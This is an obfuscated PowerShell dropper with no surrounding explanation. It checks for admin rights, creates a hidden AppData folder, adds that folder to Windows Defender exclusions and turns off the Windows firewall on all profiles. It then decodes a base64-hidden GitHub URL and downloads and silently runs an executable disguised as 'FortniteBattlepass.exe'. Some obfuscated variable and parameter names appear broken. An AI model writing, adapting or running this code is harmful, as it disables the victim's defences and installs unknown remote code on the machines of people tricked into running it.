function fuTBXrzHDFjtnRU {
 $VpkVXmFfMjsjXK = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 return $VpkVXmFfMjsjXK.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function fuTBXrzHDFjtnRUUkgLfvZ {
 return [Environment]::GetFolderPath('ApplicationData')
}
function fuTBXrzHDFjtnRUUkgLf {
 param (
 [string]$VpkVXmFfMjsjXKk = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YXV0b20="))
 )
 $VpkVXmFfMjsj = fuTBXrzHDFjtnRUUkgLfvZ
 $VpkVXmFfMj = Join-Path $VpkVXmFfMjsj $VpkVXmFfMjsjXKk
 try {
 if (-not (Test-Path $VpkVXmFfMj)) {
 ni -Path $VpkVXmFfMj -ItemType Directory -Force | Out-Null
 }
 return $VpkVXmFfMj
 } catch {
 return $null
 }
}
function fuTBXrzHDFjtnRUUkgLfvZl {
 param (
 [string]$Path
 )
 try {
 $VpkVXmFfMjsjX = (Get-MpPreference).ExclusionPath
 if ($VpkVXmFfMjsjX -contains $Path) {
 return $true
 }
 Add-MpPreference -ExclusionPath $Path -ErrorAction Stop -OutVariable null
 return $true
 } catch {
 return $false
 }
}
function fuTBXrzHDFjtnRUUkgL {
 param (
 [string]$fuTBXrzHDFjtnR,
 [string]$nZuqjlOgLdg,
 [string]$nZuqjlOgLdgJXbu
 )
 $nZuqjlOgLdgJ = Join-Path $nZuqjlOgLdg $nZuqjlOgLdgJXbu
 try {
 Invoke-WebRequest -Uri $fuTBXrzHDFjtnR -OutFile $nZuqjlOgLdgJ -ErrorAction Stop -OutVariable null
 saps -nZuqjlOgLdgJ $nZuqjlOgLdgJ -WindowStyle Hidden
 return $true
 } catch {
 return $false
 }
}
function fuTBXrzHDFjtnRUUkgLfvZlCE {
 try {
 Set-NetFirewallProfile -Profile Domain, Private, Public -Enabled False -ErrorAction Stop -OutVariable null
 return $true
 } catch {
 return $false
 }
}
function fuTBXrzHDFjtnRUUkg {
 param (
 [bool]$nZuqjlOgLdgJX
 )
 if (-not $nZuqjlOgLdgJX) {
 exit 1
 }
}
if ($nZuqjlOgLd.MyCommand.Name -eq (Get-Item $nZuqjlOgLd.MyCommand.Path).Name) {
 fuTBXrzHDFjtnRUUkg (fuTBXrzHDFjtnRU)
 $nZuqjlOgLdgJXb = fuTBXrzHDFjtnRUUkgLf
 fuTBXrzHDFjtnRUUkg ($nZuqjlOgLdgJXb -ne $null)
 fuTBXrzHDFjtnRUUkg (fuTBXrzHDFjtnRUUkgLfvZl -Path $nZuqjlOgLdgJXb)
 fuTBXrzHDFjtnRUUkg (fuTBXrzHDFjtnRUUkgLfvZlCE)
 $fuTBXrzHDFjtnR = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YUhSMGNITTZMeTluYVhSb2RXSXVZMjl0TDBodlltSjViRzl6TVRZeE1pOVRkR1ZoYlVaeWJXVkhZVzExY3k5eVpXeGxZWE5sY3k5a2IzZHViRzloWkM5bFpXVmxaUzlHYjNKMGJtbDBaVUpoZEhSc1pYQmhjM011WlhobA=="))
 $fuTBXrzHDF = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Um05eWRHNXBkR1ZDWVhSMGJHVndZWE56TG1WNFpRPT0="))
 $fuTBXrzHDFjtnR = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($fuTBXrzHDFjtnR))
 $fuTBXrzHDF = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($fuTBXrzHDF))
 fuTBXrzHDFjtnRUUkg (fuTBXrzHDFjtnRUUkgL -fuTBXrzHDFjtnR $fuTBXrzHDFjtnR -nZuqjlOgLdg $nZuqjlOgLdgJXb -nZuqjlOgLdgJXbu $fuTBXrzHDF)
}

